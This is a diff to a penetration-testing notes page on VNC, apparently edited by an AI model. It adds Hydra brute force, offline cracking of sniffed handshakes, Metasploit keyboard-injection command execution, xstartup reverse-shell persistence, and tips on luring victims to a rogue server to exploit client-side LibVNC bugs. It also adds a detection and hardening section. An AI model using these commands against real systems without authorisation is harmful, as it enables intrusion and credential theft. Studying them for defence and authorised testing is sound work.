@@ -1,13 +1,28 @@
+# VNC
+
 #VNC #VirtualNetworkComputing #remotedesktop #remoteaccess
 
 ## What is VNC?
-Virtual Network Computing — cross-platform graphical remote desktop sharing system using RFB (Remote Framebuffer) protocol. Multiple implementations: TigerVNC, TightVNC, RealVNC, LibVNCServer. No encryption in base protocol (use SSH tunnel or VNC over TLS for security).
+Virtual Network Computing — cross-platform graphical remote desktop sharing system using RFB (Remote Framebuffer) protocol. Multiple implementations: TigerVNC, TightVNC, RealVNC, LibVNCServer. No encryption in base protocol (use SSH tunnel or VNC over TLS for security). VNC authentication is a DES challenge-response over an **8-byte** key — the password is silently truncated to 8 characters, so the keyspace is small and crackable.
 
 - Port: **TCP 5900** — VNC display :0
 - Port: **TCP 5901** — VNC display :1 (first user session)
 - Port: **TCP 5902+** — additional displays
 - Port: **TCP 5800** — Java VNC web client (HTTP)
 - Port: **TCP 6001** — X11 display (sometimes co-located)
+
+---
+
+## Tools
+
+| Tool | Use |
+|---|---|
+| [[Tools/Scanning/NMAP\|NMAP]] | `vnc-info` (version + security type), `vnc-brute` NSE |
+| [[Tools/Payloads & Shells/metasploit\|metasploit]] | `vnc_none_auth`, `vnc_login`, `vnc_keyboard_exec`; RFB DES decrypt |
+| [[Tools/Auth/Hydra\|Hydra]] | Password brute (`vnc://`) |
+| [[Tools/Auth/john the ripper\|John]] | `vncpcap2john` — crack the DES challenge from a captured handshake |
+
+Also used inline: `vncviewer`/`xtigervncviewer`/`Remmina` (RFB clients), `vncsnapshot` (headless screenshot), `vncpasswd.py` (decrypt a stored `~/.vnc/passwd` with the fixed DES key).
 
 ---
 
@@ -126,6 +141,16 @@ Rex::Proto::RFB::Cipher.decrypt(["<hex_hash>"].pack('H*'), fixedkey)
 python3 vncpasswd.py -d -H <hex_hash>
 ```
 
+### Crack the Challenge from a Captured Handshake
+
+```bash
+# VNC auth is a DES challenge-response — if you sniff a login, crack it offline.
+# Extract the challenge/response pair from the pcap, then john it:
+vncpcap2john capture.pcap > vnc.hash
+john vnc.hash --wordlist=/usr/share/wordlists/rockyou.txt
+# (password is truncated to 8 chars, so this is fast)
+```
+
 ### xstartup Abuse (Post-Access Persistence/Escalation)
 
 ```bash
@@ -137,13 +162,36 @@ EOF
 # Next time VNC session starts, get reverse shell
 ```
 
-### CVE-2019-15694 (LibVNCServer Heap Overflow)
+### Post-Access Command Execution
 
 ```bash
-# LibVNCServer < 0.9.12 — heap overflow via HandleCursorShape
-# Allows RCE without authentication
-use exploit/multi/vnc/libvncserver_client_cut_text
+# With VNC access (or no-auth), drive the desktop to run commands — MSF types into the session
+use exploit/multi/vnc/vnc_keyboard_exec
+set RHOSTS <target>
+run
+# Or interactively: connect with vncviewer and use the GUI (open a terminal, run tools)
 ```
+
+### LibVNC Client-Side CVEs (malicious server → connecting client)
+
+```text
+# The LibVNCServer/libvncclient CVE cluster (incl. CVE-2019-15694 OOB in HandleCursorShape,
+# < 0.9.12) is a CLIENT-side bug: a MALICIOUS VNC SERVER compromises a viewer that connects
+# to it — NOT an unauth RCE against a target VNC server. Use it by luring a victim's vncviewer
+# to your rogue server, not by pointing a module at their listener.
+# (No stock Metasploit server-attacks-client module ships for this — weaponise via a patched
+# LibVNCServer or a public PoC.)
+```
+
+---
+
+## Detection & Artefacts
+
+- **RFB is unencrypted by default** — the DES challenge/response and (on plain RFB) the framebuffer are on the wire; a capture yields a crackable hash (`vncpcap2john`) or, on no-auth servers, the raw screen.
+- **No-auth VNC (Security Type 1)** exposes a live desktop to anyone who connects — the loudest misconfiguration; Shodan/masscan sweeps of 5900–5910 find these at scale.
+- **Weak logging:** most VNC servers log little; the tells are a new RFB session from an unexpected IP, and (post-access) a modified `~/.vnc/xstartup` or a new `~/.vnc/passwd` — check both for persistence.
+- **Screenshots without interaction** (`vncsnapshot`, MSF `screen_spy`) leave no host-side trace beyond the connection itself.
+- Defensive baseline: require auth, tunnel over SSH/TLS, bind to localhost, patch LibVNC, and restrict 5900+ to a management network.
 
 ---
 
@@ -170,3 +218,9 @@ use exploit/multi/vnc/libvncserver_client_cut_text
 | Brute force | `hydra -P rockyou.txt vnc://host` |
 | SSH tunnel | `ssh -L 5901:127.0.0.1:5901 user@host -N` |
 | Decrypt passwd | `python3 vncpasswd.py -d -H <hash>` |
+
+---
+
+*Created: 2026-07-13*
+*Updated: 2026-09-23*
+*Model: claude-opus-4-8*
